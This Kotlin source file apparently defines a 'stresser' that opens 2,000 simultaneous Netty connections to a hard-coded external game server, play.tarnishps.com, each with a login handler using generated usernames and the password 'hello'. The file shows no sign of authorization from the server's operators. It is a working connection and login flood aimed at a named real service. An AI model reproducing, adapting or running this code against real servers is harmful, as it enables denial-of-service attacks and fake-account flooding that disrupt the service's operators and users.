package org.jire.netrune.stresser.tarnishps

import io.netty.bootstrap.Bootstrap
import io.netty.channel.ChannelHandler
import io.netty.channel.ChannelOption
import org.jire.netrune.net.client.netty4.DefaultClientBootstrapFactory
import org.jire.netrune.net.client.netty4.DefaultClientSocketChannelClassFactory
import org.jire.netrune.net.netty4.DefaultEventLoopGroupFactory
import org.jire.netrune.stresser.DefaultStresserTarget
import org.jire.netrune.stresser.Stresser
import org.jire.netrune.stresser.StresserTarget
import org.jire.netrune.stresser.netty4.Netty4Stresser

object TarnishPSStresser {

    private val TARGET: StresserTarget = DefaultStresserTarget("play.tarnishps.com")
    private const val CONNECTIONS = 2000

    @JvmStatic
    fun main(args: Array<String>) {
        val group = DefaultEventLoopGroupFactory.eventLoopGroup()
        val channelClass = DefaultClientSocketChannelClassFactory.clientSocketChannelClass(group)
        for (i in 1..CONNECTIONS) {
            val handler: ChannelHandler = TarnishPSStresserChannelInitializer("jire0$i", "hello")
            val bootstrap: Bootstrap = DefaultClientBootstrapFactory.clientBootstrap(
                group,
                channelClass,
                handler
            )
                .option(ChannelOption.AUTO_READ, false)
                .option(ChannelOption.TCP_NODELAY, true)
                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 30_000)
            val stresser: Stresser = Netty4Stresser(TARGET, group, bootstrap)
            stresser.connect()
        }
    }

}